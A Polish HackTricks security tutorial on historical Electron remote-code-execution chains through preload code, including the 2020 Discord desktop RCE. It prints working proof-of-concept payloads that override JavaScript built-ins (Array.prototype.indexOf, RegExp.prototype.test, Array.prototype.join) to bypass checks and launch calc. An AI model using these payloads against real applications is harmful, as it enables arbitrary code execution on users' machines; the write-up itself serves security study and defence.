# Electron contextIsolation RCE przez kod preload

{{#include ../../banners/hacktricks-training.md}}

Są to **historyczne łańcuchy ataku**, w których kod preload współdzielił intrinsics JavaScript lub uprzywilejowane API z treścią renderera kontrolowaną przez atakującego. Gdy context isolation jest włączone, preload i strona mają zazwyczaj oddzielne realms JavaScript, więc nadpisania prototypów na stronie nie wpływają automatycznie na obiekty preload. Zweryfikuj łańcuch ataku dla dokładnej wersji Electron/aplikacji i implementacji bridge.<sup>[[3]](#references)</sup>

## Przykład 1

Przykład z [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30)<sup>[[1]](#references)</sup>

Ten kod otwiera linki http(s) w domyślnej przeglądarce:

![Electron contextIsolation RCE przez kod preload - Przykład 1: Ten kod otwiera linki http(s) w domyślnej przeglądarce](<../../images/image (768).png>)

W podatnej historycznej aplikacji nawigacja do pliku lokalnego, taka jak `file:///C:/Windows/System32/calc.exe`, mogła uruchomić ścieżkę wywołującą system operacyjny; `SAFE_PROTOCOLS.indexOf` miało temu zapobiegać.

Dlatego atakujący mógł wstrzyknąć ten kod JS za pomocą XSS lub dowolnej nawigacji strony:

```html
<script>
  Array.prototype.indexOf = function () {
    return 1337
  }
</script>
```

Ponieważ wywołanie `SAFE_PROTOCOLS.indexOf` zawsze zwróci 1337, atakujący może ominąć zabezpieczenie i uruchomić calc. Końcowy exploit:

```html
<script>
  Array.prototype.indexOf = function () {
    return 1337
  }
</script>
<a href="file:///C:/Windows/systemd32/calc.exe">CLICK</a>
```

Sprawdź oryginalne slajdy, aby znaleźć inne sposoby uruchamiania programów bez wyświetlania monitu o uprawnienia.<sup>[[1]](#references)</sup>

W historycznym łańcuchu Discorda rozważano również ładowanie w stylu UNC przez `file://127.0.0.1/electron/rce.jar` jako inną potencjalną ścieżkę wykonania; sprawdź, czy jest ona dostępna w konkretnej wersji Windows/Electron.<sup>[[2]](#references)</sup>

## Przykład 2: RCE w aplikacji Discord

Przykład z [https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1](https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1)<sup>[[2]](#references)</sup>

Podczas sprawdzania skryptów preload zauważyłem, że Discord udostępnia stronie funkcję, która pozwala wywoływać niektóre dozwolone moduły za pomocą `DiscordNative.nativeModules.requireModule('MODULE-NAME')`.\
Nie mogłem tu użyć modułów umożliwiających bezpośrednie RCE, takich jak moduł _child_process_, ale **znalazłem kod umożliwiający uzyskanie RCE przez nadpisanie wbudowanych metod JavaScript** i zakłócenie działania udostępnionego modułu.

Poniżej znajduje się PoC. Udało mi się potwierdzić, że aplikacja **calc** zostaje **uruchomiona**, gdy z devTools wywoł**uję funkcję `getGPUDriverVersions`**, zdefiniowaną w module o nazwie "_discord_utils_", jednocześnie **nadpisując `RegExp.prototype.test` i `Array.prototype.join`**.

```javascript
RegExp.prototype.test = function () {
  return false
}
Array.prototype.join = function () {
  return "calc"
}
DiscordNative.nativeModules
  .requireModule("discord_utils")
  .getGPUDriverVersions()
```

Funkcja `getGPUDriverVersions` próbuje uruchomić program przy użyciu biblioteki "_execa_", jak pokazano poniżej:

```javascript
module.exports.getGPUDriverVersions = async () => {
  if (process.platform !== "win32") {
    return {}
  }

  const result = {}
  const nvidiaSmiPath = `${process.env["ProgramW6432"]}/NVIDIA Corporation/NVSMI/nvidia-smi.exe`

  try {
    result.nvidia = parseNvidiaSmiOutput(await execa(nvidiaSmiPath, []))
  } catch (e) {
    result.nvidia = { error: e.toString() }
  }

  return result
}
```

Zazwyczaj _execa_ próbuje uruchomić „_nvidia-smi.exe_”, określony w zmiennej `nvidiaSmiPath`. Jednak z powodu nadpisania `RegExp.prototype.test` i `Array.prototype.join` **argument zostaje zastąpiony przez „**_**calc**_**” podczas wewnętrznego przetwarzania w _execa**_**.**

Argument zostaje zastąpiony przez wpływ na ścieżki rozwiązywania poleceń i przetwarzania argumentów w historycznym parserze `cross-spawn`.<sup>[[4]](#references)</sup>

## References

- [1] [Electron: Wykorzystanie braku izolacji kontekstu — CureCon (en)](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30)
- [2] [RCE w aplikacji Discord Desktop](https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1)
- [3] [Electron — Izolacja kontekstu](https://www.electronjs.org/docs/latest/tutorial/context-isolation)
- [4] [Zmiana wersji parsera `node-cross-spawn` i dokładne ścieżki użyte w łańcuchu (wiersze 36–55)](https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L36-L55)
{{#include ../../banners/hacktricks-training.md}}
